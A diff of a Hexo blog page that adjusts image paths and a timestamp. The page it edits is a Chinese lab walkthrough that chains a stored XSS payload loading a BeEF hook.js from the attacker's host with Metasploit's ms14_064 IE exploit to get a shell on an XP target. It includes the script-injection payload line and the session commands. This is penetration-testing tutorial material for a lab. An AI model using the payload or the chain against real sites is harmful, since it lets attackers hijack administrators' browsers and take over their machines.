@@ -14,20 +14,20 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="内网渗透通过IE的漏洞提升我们的权限 环境攻击机：Kali(192.168.209.138)靶机：32位XP(192.168.209.129)我们使用BEEF+MSF##攻击流程我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下： 123456789101112131415">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img1.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img2.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img3.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img4.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img5.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img6.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img7.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img8.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img1.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img2.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img3.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img4.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img5.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img6.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img7.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img8.jpg">
 <meta property="article:published_time" content="2020-01-06T10:59:02.000Z">
-<meta property="article:modified_time" content="2020-01-09T03:37:46.126Z">
+<meta property="article:modified_time" content="2020-01-09T03:40:38.634Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="内网入侵">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/BEEF-MSF/img1.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img1.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -104,18 +104,18 @@
 
 <p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
 <p>既然我们的监听端开启了，我们就来利用BEEF欺骗吧，首先打开我们的BEEF，这里说一下我的Kali没有自带，大家一样的话呢需要安装的。</p>
-<p>打开BEEF之后会出现下面的页面：<br><img src="BEEF-MSF/img1.jpg" alt="BEEF页面"></p>
+<p>打开BEEF之后会出现下面的页面：<br><img src="img1.jpg" alt="BEEF页面"></p>
 <p>我们扫描一下目标网站的端口，发现开了80，打开网站，发现这么一个网址：</p>
-<p><img src="BEEF-MSF/img2.jpg" alt="网站页面"></p>
+<p><img src="img2.jpg" alt="网站页面"></p>
 <p>发现是一个小论坛，我们猜测有XSS，这个时候我们提交我们的恶意JS代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;192.168.209.138:3000&#x2F;hook.js&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="BEEF-MSF/img3.jpg" alt="管理员视野"></p>
-<p>我们的BEEF上线了：<br><img src="BEEF-MSF/img4.jpg" alt="BEEF上线页面"></p>
-<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="BEEF-MSF/img5.jpg" alt="BEEF重定向"></p>
-<p><img src="BEEF-MSF/img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
+<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="img3.jpg" alt="管理员视野"></p>
+<p>我们的BEEF上线了：<br><img src="img4.jpg" alt="BEEF上线页面"></p>
+<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="img5.jpg" alt="BEEF重定向"></p>
+<p><img src="img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i</span><br></pre></td></tr></table></figure>
-<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="BEEF-MSF/img7.jpg" alt="MSF执行"><br><img src="BEEF-MSF/img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>
+<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="img7.jpg" alt="MSF执行"><br><img src="img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>
 
       
     </div>
